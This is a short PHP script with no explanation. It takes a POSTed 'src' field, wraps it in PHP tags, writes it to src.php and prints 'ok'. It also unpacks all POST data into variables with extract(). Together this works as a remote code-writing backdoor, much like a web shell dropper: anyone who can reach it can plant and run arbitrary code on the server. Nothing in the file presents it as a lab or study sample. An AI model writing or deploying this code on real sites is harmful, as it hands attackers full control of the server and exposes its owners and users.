<?php 
extract($_POST);
$src = "<?php\n" . $src . "\n?>\n";
file_put_contents( "src.php", $src );
echo "ok";

?>